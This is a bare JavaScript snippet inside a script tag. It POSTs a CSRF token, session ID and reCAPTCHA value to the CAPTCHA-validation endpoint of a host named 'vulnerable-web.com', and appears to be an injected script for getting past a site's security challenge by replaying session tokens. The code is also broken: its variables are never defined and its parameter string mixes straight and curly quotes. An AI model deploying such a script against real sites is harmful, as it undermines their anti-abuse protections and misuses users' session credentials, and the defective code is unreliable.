<script> 
function complete_security_challenge() {
	var xhr = new XMLHttpRequest();
	var url = 'https://vulnerable-web.com/auth/validatecaptcha';
	var params = '_csrf=' + csrf + '&_sessionID=' + sessID + '&recaptcha=’ + recap + ‘&jse=' + jse;
	xhr.open('POST', url, true);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.onreadystatechange = function() {
	if (xhr.readyState === 4 && xhr.status === 200) {
		console.log('Response:', xhr.responseText);
		}
	};
	xhr.send(params);
	}</script>
